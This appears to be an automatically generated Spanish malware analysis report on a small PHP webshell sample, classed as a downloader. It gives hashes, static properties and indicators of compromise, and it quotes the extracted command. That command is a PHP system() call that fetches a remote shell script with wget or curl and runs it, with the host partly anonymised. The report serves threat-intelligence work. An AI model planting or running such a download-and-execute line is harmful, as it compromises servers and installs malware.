# 🧬 Payload Analysis

`5b4c25be5c1c30c0db980e8825a9965c44b5741629361d4dfd269a5360134ac1`

## 📌 Resumen

Artefacto asociado a la familia **webshell** con evidencia suficiente para atribución. Comportamientos destacados: Descarga remota, Ejecución. Se asoció 1 comando observado o extraído.

## 🏷️ Clasificación

- **Categoría:** `Downloader / Dropper`
- **Familia:** `webshell`
- **Confianza de familia:** `Media`
- **Riesgo:** `High`

## 🗓️ Registro

- **Registrado:** `2026-08-09T19:51:31+00:00`
- **Tipo de registro:** `snapshot inmutable`

## 🔐 Identidad

- **SHA256:** `5b4c25be5c1c30c0db980e8825a9965c44b5741629361d4dfd269a5360134ac1`
- **SHA1:** `955bb459ff9f29befacf9860602835053523f93a`
- **MD5:** `d7358fe11551d0cbef8ef6f67d1a9dfa`

## 🧪 Análisis estático

| Propiedad | Resultado |
| --- | --- |
| Descripción | ASCII text, with CRLF line terminators |
| Tamaño | 436 B |
| Entropía | 5.45 |
| Strings | 8 |

## 🧠 Comportamiento observado

1. **Descarga remota**
2. **Ejecución**

## 🔬 Evidencia de clasificación

- Capacidad detectada: Descarga remota
- Motivos técnicos: mime=ASCII text, with CRLF line terminators; iocs=5

## 🖥️ Comandos observados / extraídos

```text
<?php system('(wget -qO- hxxp://45.153.34.XXX/rondo.``dtm.sh||busybox wget -qO- hxxp://45.153.34.XXX/rondo.``dtm.sh||cur
```

## 🌐 Indicadores

| Tipo | Valor | Contexto |
| --- | --- | --- |
| ip | 190.179.169.XXX | static_analysis |
| ip | 45.153.34.XXX | static_analysis |
| url | hxxp://45.153.34.XXX/rondo. | strings |
| hash | 5b4c25be5c1c30c0db980e8825a9965c44b5741629361d4dfd269a5360134ac1 | static_analysis |
| command | <?php system('(wget -qO- hxxp://45.153.34.XXX/rondo.``dtm.sh\|\|busybox wget -qO- hxxp://45.153.34.XXX/rondo.``dtm.sh\|\|cur | strings |
| ip | 94.154.43.XXX | artifact_source |

## 🔎 Triage

| Campo | Valor |
| --- | --- |
| Categoría | low interest unknown |
| Prioridad | low |

## 🛡️ Nota de publicación

Este informe conserva una **fotografía del estado de análisis en la fecha de registro**. No se mantienen campos temporales de observación ni contadores vivos.

Las IPv4 públicas se anonimizaron como `A.B.C.XXX`; las direcciones internas, credenciales, tokens y otros secretos se redactan antes de publicar.
